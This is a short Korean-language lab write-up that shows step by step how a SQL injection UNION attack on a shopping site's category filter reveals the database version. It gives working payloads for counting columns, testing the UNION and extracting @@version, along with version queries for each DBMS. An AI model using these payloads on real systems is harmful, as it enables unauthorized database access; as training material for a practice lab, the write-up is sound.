# 🔐 UNION — DB 버전 탈취

**목표**: 카테고리 필터를 우회하여 웹 페이지에 DB 버전 노출 

<br />

## 🧪 실습

1️⃣ **컬럼 수 파악**: `ORDER BY n`로 에러가 나는 n-1이 컬럼 수

```text
/filter?category=Pets' order by 1# -> OK
... ' order by 2# -> OK
... ' order by 3# -> ERROR  => 컬럼 수 = 2
```

🕵️‍♀️ 참고할 단서: 2개 이상의 스트링 데이터를 사용하고 있다. <br />
<img width="293" height="86" alt="image" src="https://github.com/user-attachments/assets/03a1bdc9-e09e-4c50-b324-7747220236e9" />

<br />

2️⃣ **UNION 테스트**: 컬럼 수·타입 맞춰 임의 문자열 반환 시도

```text
/filter?category=Pets' union select 'hello','world'#  -> 페이지에 노출되면 성공
```

<img width="129" height="101" alt="image" src="https://github.com/user-attachments/assets/d9a9435c-dc9a-4e01-ae13-bcceaa53ddd6" />

<br />

3️⃣ **버전 추출**: DB별 버전 함수/변수 사용

```text
/filter?category=Pets' union select @@version, null#
```

<img width="200" height="60" alt="image" src="https://github.com/user-attachments/assets/b0f3c417-2eb3-454f-999d-2e9fe74e6a10" />

<br /><br />

## 🤝 참고

DB 유형별 버전 조회:
```sql
-- Oracle
SELECT banner FROM v$version
SELECT version FROM v$instance

-- Microsoft
SELECT @@version

-- PostgreSQL
SELECT version()

-- MySQL
SELECT @@version
```

<br />

UNION 조건:<br />
→ 컬럼 수 동일, 데이터 타입 호환, 필요 시 alias 사용

```sql
SELECT a AS X, b AS Y
FROM TABLE_1
UNION
SELECT c AS X, d AS Y
FROM TABLE_2;
```
